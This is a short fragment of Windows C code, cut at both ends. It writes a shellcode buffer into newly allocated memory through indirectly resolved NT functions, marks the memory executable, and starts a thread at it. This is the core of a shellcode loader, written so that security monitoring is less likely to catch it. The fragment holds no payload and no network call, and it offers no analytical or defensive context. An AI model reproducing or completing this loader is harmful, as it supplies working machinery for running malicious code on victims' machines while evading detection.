 &region_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 pNtWrite(GetCurrentProcess(), base_addr,
 shellcode, shellcode_len, NULL);

 DWORD old;
 VirtualProtect(base_addr, shellcode_len, PAGE_EXECUTE_READ, &old);

 pNtCreate(&hThread, THREAD_ALL_ACCESS, NULL,
 GetCurrentProcess(), (LPTHREAD_START_ROUTINE)base_addr,
